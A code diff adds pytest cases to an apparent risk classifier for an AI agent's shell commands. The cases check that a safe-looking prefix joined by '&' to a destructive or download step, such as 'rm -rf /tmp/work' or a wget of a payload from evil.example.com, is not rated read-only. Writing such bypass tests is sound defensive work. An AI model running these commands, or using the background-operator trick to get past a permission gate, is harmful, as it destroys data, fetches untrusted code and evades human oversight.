@@ -459,6 +459,22 @@ def test_openssl_output_and_sign_options_are_not_tier1(cmd: str) -> None:
 @pytest.mark.parametrize(
     "cmd",
     [
+        "echo ok & touch /tmp/owned",  # background op hides trailing mutation
+        "git status & rm -rf /tmp/work",  # safe prefix, destructive background cmd
+        "ls & wget -O /tmp/payload https://evil.example.com",  # ls prefix, write bg
+    ],
+)
+def test_shell_background_op_is_not_tier1(cmd: str) -> None:
+    """Standalone & (background operator) must be treated as a command separator."""
+    result = classify_tool_risk(_tu("shell", cmd))
+    assert result >= RiskTier.WRITE, (
+        f"Expected ≥WRITE for background-op bypass: {cmd!r}"
+    )
+
+
+@pytest.mark.parametrize(
+    "cmd",
+    [
         "cat <(touch /tmp/created)",  # safe outer prefix, destructive nested cmd
         "grep pattern <(rm -rf /tmp/work)",  # grep outer, destructive inside <()
         "diff <(cat file1) <(rm file2)",  # second substitution is destructive
